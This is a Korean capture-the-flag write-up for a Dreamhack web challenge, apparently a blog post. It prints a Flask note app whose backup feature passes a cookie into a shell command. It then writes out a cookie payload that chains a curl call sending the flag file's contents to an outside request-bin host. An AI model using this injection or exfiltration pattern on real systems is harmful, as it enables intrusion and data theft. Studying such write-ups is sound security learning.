---
title: "🔒 (1) Simple-Note-Manager"
date: 2025-08-018 00:00:00 +0900
categories: ["< Dreamhack >", Wargame, "- Web"]
tags: [dreamhack, wargame, level 1, simple note manager, command injection, command substitution, flask]
published: true
password: "tjwjddltoddlf"
abstract: "해당글은 비밀글 입니다."
message: "비밀번호를 입력하세요."
---

## Dreamhack / Wargame

---

#### Difficulty Level : 1
#### Title : Simple Note Manager

---

![snm figure1](/assets/img/dreamhack/2025-08-18-15-51-21.png)

우선 소스코드를 살펴보기 전에, 문제 서버를 생성하고 접속해보았다.

![snm figure2](/assets/img/dreamhack/2025-08-18-15-54-42.png)

문제에 접속하면, 다음과 같은 화면을 볼 수 있다.

버튼들을 하나씩 눌러봤을 때 동작은 다음과 같았다.

- create : 문자를 입력하고 create 버튼을 누르면 노트를 생성함.  
- update : 수정할 인덱스 번호를 입력하고 내용을 입력하면 해당 인덱스의 노트 내용이 수정됨  
- delete : 삭제할 인덱스 번호를 입력하고 delete를 누르면 해당 노트가 삭제됨  
- backup : `back up` 버튼이 존재하나, 정확히 어떤 동작을 하는지 모르겠음  

<br>

이제 문제에서 제공한 소스코드를 살펴보기로 했다.

문제를 다운 받고 압축을 풀어보면,

![snm figure3](/assets/img/dreamhack/2025-08-18-16-01-35.png)

다음과 같이 구성되어 있음을 볼 수 있다.

<br>

그리고 app.py의 소스코드는 다음과 같다.

```python
#!/usr/bin/env python3
import subprocess
import threading
import time
from flask import Flask, make_response, redirect, request, abort, render_template, url_for

app = Flask(__name__)

lock = threading.Lock()
new_note_id = 0
notes = {}

def create_note(content):
    global new_note_id
    with lock:
        note_id = new_note_id
        new_note_id += 1
        notes[note_id] = content
        return notes[note_id]

def read_note(note_id):
    with lock:
        return notes[note_id]

def update_note(note_id, content):
    with lock:
        notes[note_id] = content
        return notes[note_id]

def delete_note(note_id):
    with lock:
        del notes[note_id]

def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)


@app.route('/', methods=['GET'])
def get_index():
    return render_template('notes.html', notes=notes)


@app.route('/notes', methods=['GET'])
def get_notes():
    return render_template('notes.html', notes=notes)


@app.route('/create_note', methods=['GET'])
def get_create_note():
    return render_template('create_note.html')


@app.route('/create_note', methods=['POST'])
def post_create_note():
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    create_note(content)
    return redirect(url_for('get_index'))


@app.route('/update_note', methods=['GET'])
def post_update_note():
    if len(notes) == 0:
        abort(404)
    return render_template('update_note.html')


@app.route('/update_note', methods=['POST'])
def get_update_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    update_note(note_id, content)
    return redirect(url_for('get_index'))


@app.route('/delete_note', methods=['GET'])
def get_delete_note():
    if len(notes) == 0:
        abort(404)
    return render_template('delete_note.html')


@app.route('/delete_note', methods=['POST'])
def post_delete_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    delete_note(note_id)
    return redirect(url_for('get_index'))


@app.route('/backup_notes', methods=['GET'])
def get_backup_notes():
    print(len(notes), flush=True)
    if len(notes) == 0:
        abort(404)
    page = render_template('backup_notes.html')
    resp = make_response(page)
    resp.set_cookie('backup-timestamp', f'{time.time()}')
    return resp


@app.route('/backup_notes', methods=['POST'])
def post_backup_notes():
    if len(notes) == 0:
        abort(404)
    backup_timestamp = request.cookies.get('backup-timestamp', f'{time.time()}')
    if not isinstance(backup_timestamp, str):
        abort(400)
    backup_notes(backup_timestamp)
    return redirect(url_for('get_index'))
```

여기서 나는 backup에 관한 기능이 궁금했기 때문에 backup 부분을 살펴보았다.

```python
def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)

@app.route('/backup_notes', methods=['GET'])
def get_backup_notes():
    print(len(notes), flush=True)
    if len(notes) == 0:
        abort(404)
    page = render_template('backup_notes.html')
    resp = make_response(page)
    resp.set_cookie('backup-timestamp', f'{time.time()}')
    return resp

@app.route('/backup_notes', methods=['POST'])
def post_backup_notes():
    if len(notes) == 0:
        abort(404)
    backup_timestamp = request.cookies.get('backup-timestamp', f'{time.time()}')
    if not isinstance(backup_timestamp, str):
        abort(400)
    backup_notes(backup_timestamp)
    return redirect(url_for('get_index'))
```

간략하게 정리하자면, 

`GET /backup_notes` : 페이지를 띄우면서 쿠키에 타임스탬프 생성  
`POST /backup_notes` : 쿠키의 타임스탬프를 이용해 `./tmp/타임스탬프` 형식으로 파일을 생성하고, `./tmp/notes.tmp` 를 복사해둠

다음과 같이 백업하는 방식이었다.

<br>

그런데 정의된 `backup_notes()` 소스코드를 잘 보면,  

```python
subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```

쿠키에 생성된 `timestamp` 값을 그대로 입력으로 사용해 쉘 명령을 실행시키는 것을 볼 수 있다.

<br>

그래서 나는 timestamp 쿠키의 값을 수정하여 flag를 읽는 명령을 수행하는 명령어를 주입한 뒤, backup 요청을 보내보기로 했다.

아까 폴더 구조를 봤을 때 현재 폴더에 `flag`가 있었으니, 다른 경로를 줄 필요 없이 `cat flag` 명령을 수행하면 될 것 같다.

그리고 요청 결과를 받아보기 위해 Dreamhack에서 제공하는 `Request Bin` 이라는 툴을 이용하기로 했다.

<br>

### Request Bin (Dreamhack's tool)

![snm figure4](/assets/img/dreamhack/2025-08-18-16-19-16.png)

링크를 생성한 뒤, `curl` 명령과 `GET` 방식으로 요청 결과를 받아볼 생각이다.

<br>

바꾼 쿠키 값 : `1234&&curl https://rmrrakl.request.dreamhack.games/?sw=$(cat flag)`

위와 같이 쿠키 값을 수정하게 되면, 

`cp ./tmp/notes.tmp /tmp/{timestamp}`

해당 명령에 

`cp ./tmp/notes.tmp /tmp/1234&&curl https://rmrrakl.request.dreamhack.games/?sw=$(cat flag)`

다음과 같이 입력이 들어갈 것이다. 동작은

./tmp/notes.tmp 를 복사하여 /temp/1234 에 복사에 성공하면,  
curl 명령이 실행되 `https://rmrrakl.request.dreamhack.games/?sw=$(cat flag)` 해당 요청을 보내게 된다.

그런데 요청을 보내기 전에 `cat flag`가 먼저 수행이 되는데,  
바로 $(...) 형식, **커맨드 서브스티튜션(Command Substitution)** 문법 때문이다.

<br>

### Command Substitution

Bash/Zsh 등 POSIX 셸의 경우 프로그램을 실행하기 전에 다음 순서로 확장하게 된다.

1. 변수 / 산술 / 커맨드를 치환함 (이때 $(cat flag)가 실행됨.)
2. 단어 분리, 글로빙 ...
3. 최종 결과를 `curl`에 넘김

<br>

그래서 `cat flag`를 통해 flag를 읽고, 생성한 링크에 `GET` 방식으로 `curl` 명령 수행.

그렇게 데이터를 보내주게 되니, 확인해보면

![snm figure5](/assets/img/dreamhack/2025-08-18-16-25-12.png)

다음과 같이, 플래그를 얻을 수 있다.

<br>

플래그 인증은 포멧에 맞춰 `DH` 다음에 `{` 하나, 문자열 끝에 `}`를 추가해서 인증해주면 된다.
